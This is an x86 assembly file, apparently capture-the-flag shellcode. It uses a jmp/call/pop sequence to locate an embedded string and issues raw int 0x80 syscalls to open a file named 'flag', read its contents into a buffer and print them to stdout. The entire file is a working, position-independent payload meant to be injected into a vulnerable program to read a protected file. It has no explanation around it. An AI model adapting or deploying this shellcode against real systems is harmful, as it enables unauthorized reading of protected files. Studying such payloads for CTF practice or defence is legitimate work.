#include <sys/syscall.h>

#define STRING  "flag"
#define STRLEN  4
.globl main
.type  main, @function


main:
  jmp	calladdr

popladdr:
  popl    %esi			/* address to file_name string */

/* open the file */
  xorl    %eax,%eax
  addl    $5,%eax		/* open( */
  movl    %esi,%ebx 		/* arg1: filename */
  xorl    %ecx,%ecx		/*   read-only mode */
  int     $0x80			/* ); */

/* Set arguments for read() */
  movl    %eax,%ebx		/* Use the file_descriptor returned by open */
  popl    %esi			/* pointer to beginning of buffer */
  movl    %esi,%ecx		/* save pointer in ecx */
  popl    %esi			/* pointer to value 1041 */
  movl    (%esi),%edx		/* move the value 1041 into edx register */

/* read the file */
  xorl    %eax,%eax
  addl    $3,%eax		/* read( */
  				/*   *buf, in ecx */
				/*   bufsize in %edx*/
				/*   file descriptor in %ebx*/
  int     $0x80			/* ); */

/* write to STDOUT */
  xorl    %eax,%eax
  addl    $4,%eax		/* write( */
  xorl    %ebx,%ebx
  inc    %ebx			/*   STDOUT file_descriptor */
  				/*   *buf in ecx*/
  int     $0x80			/* ); */

/* Exit */
  xorl    %ebx,%ebx
  movl    %ebx,%eax
  inc     %eax
  int     $0x80

calladdr:
  call    calladdr2
  .long   1041

calladdr3:
  call popladdr
  .string STRING

calladdr2:
  call    calladdr3
  .space   1041,0xF


